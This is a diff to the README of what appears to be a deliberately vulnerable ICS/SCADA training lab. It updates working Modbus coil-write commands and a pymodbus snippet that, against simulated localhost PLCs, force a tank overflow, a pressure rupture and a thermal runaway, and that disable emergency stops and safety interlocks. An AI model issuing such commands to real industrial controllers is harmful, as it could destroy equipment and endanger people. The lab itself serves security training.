@@ -46,22 +46,38 @@ pip install modbus-cli
 firefox http://localhost:5000  # PLC-1
 ```
 
-**Try your first attack (works on ALL 4 PLCs!):**
+**Try your first attack (Modbus Coil Control):**
+
+> **Note:** Real PLCs use **coils** for digital outputs (pumps, valves) and **registers** for analog values (levels, temps). Use Modbus function 0x05 to write coils!
+
 ```bash
-# PLC-1: Force tank overflow
-sudo modbus 127.0.0.1:5502 write 0 1   # Pump ON
-sudo modbus 127.0.0.1:5502 write 1 0   # Valve CLOSED
+# Using modbus-cli (if installed):
+pip install modbus-cli
 
-# PLC-2: Pressure spike
-sudo modbus 127.0.0.1:5503 write 0 1   # Compressor ON
+# PLC-1: Force tank overflow (coil 0 = pump1, coil 3 = valve1)
+sudo modbus write-coil 127.0.0.1:5502 0 1    # Pump ON
+sudo modbus write-coil 127.0.0.1:5502 3 0    # Valve CLOSED
 
-# PLC-3: Thermal runaway
-sudo modbus 127.0.0.1:5504 write 0 1   # Heater ON
+# PLC-2: Pressure spike (coil 0 = compressor1)
+sudo modbus write-coil 127.0.0.1:5503 0 1    # Compressor ON
 
-# PLC-4: Disable safety systems
-sudo modbus 127.0.0.1:5505 write 0 0   # Emergency stop OFF
+# PLC-3: Thermal runaway (coil related to heaters)
+sudo modbus write-coil 127.0.0.1:5504 0 1    # Heater ON
+
+# PLC-4: Disable safety (coil 0 = emergency stop)
+sudo modbus write-coil 127.0.0.1:5505 0 0    # Emergency stop OFF
 
 # Watch the consequences on HMI: http://localhost:8000 (local) or check PLC web interfaces (Docker)
+```
+
+**Python alternative (raw Modbus):**
+```python
+from pymodbus.client import ModbusTcpClient
+
+client = ModbusTcpClient('127.0.0.1', port=5502)
+client.write_coil(0, True)   # Turn pump ON
+client.write_coil(3, False)  # Close valve
+client.close()
 ```
 
 ---
@@ -77,7 +93,8 @@ sudo modbus 127.0.0.1:5505 write 0 0   # Emergency stop OFF
 
 **Not fake HTTP endpoints** - actual Modbus TCP protocol with:
 - Proper MBAP header parsing
-- Function codes: 0x03 (Read), 0x06 (Write Single), 0x10 (Write Multiple)
+- **6 Modbus function codes:** 0x01, 0x03, 0x05, 0x06, 0x0F, 0x10
+- **Realistic control:** Coils for pumps/valves, Registers for levels/temps
 - Stability improvements (recv_exact, connection semaphore, socket timeout)
 - Works with real tools: `modbus-cli`, `pymodbus`, Metasploit SCADA modules
 
@@ -218,31 +235,35 @@ See [Docker Installation](#docker-installation) section for setup instructions.
 **Tank Overflow (PLC-1 - Visual Impact):**
 ```bash
 # Open HMI: http://localhost:8000
-sudo modbus 127.0.0.1:5502 write 0 1   # Force pump ON
-sudo modbus 127.0.0.1:5502 write 1 0   # Force valve CLOSED
+sudo modbus write-coil 127.0.0.1:5502 0 1   # Force pump ON (coil 0)
+sudo modbus write-coil 127.0.0.1:5502 3 0   # Force valve CLOSED (coil 3)
 # Watch tank overflow in real-time!
 ```
 
 **Pressure Vessel Rupture (PLC-2):**
 ```bash
-sudo modbus 127.0.0.1:5503 write 0 1   # Compressor ON
-sudo modbus 127.0.0.1:5503 write 1 0   # Relief valve CLOSED
+sudo modbus write-coil 127.0.0.1:5503 0 1   # Compressor ON (coil 0)
+sudo modbus write-coil 127.0.0.1:5503 4 0   # Relief valve CLOSED (coil 4)
 # Pressure rises until rupture
 ```
 
 **Thermal Runaway (PLC-3):**
 ```bash
-sudo modbus 127.0.0.1:5504 write 0 1   # Heater 1 ON at full power
-sudo modbus 127.0.0.1:5504 write 2 0   # Cooler 1 OFF
+# Control heaters/coolers via coils
+sudo modbus write-coil 127.0.0.1:5504 0 1   # Heater 1 ON (coil 0)
+sudo modbus write-coil 127.0.0.1:5504 2 0   # Cooler 1 OFF (coil 2)
 # Temperature rises uncontrollably
 ```
 
 **Safety System Bypass (PLC-4):**
 ```bash
-sudo modbus 127.0.0.1:5505 write 0 0   # Disable emergency stop
-sudo modbus 127.0.0.1:5505 write 1 0   # Disable safety interlock
+# Disable safety via coils (digital outputs)
+sudo modbus write-coil 127.0.0.1:5505 0 0   # Disable emergency stop
+sudo modbus write-coil 127.0.0.1:5505 1 0   # Disable safety interlock
 # All safety systems now bypassed - catastrophic!
 ```
+
+> **Technical Note:** Coils (0x05/0x0F) control digital outputs like pumps and valves. Registers (0x06/0x10) set analog values like setpoints and speeds. This matches real industrial PLCs!
 
 **SQL Injection (Web Interface):**
 ```bash
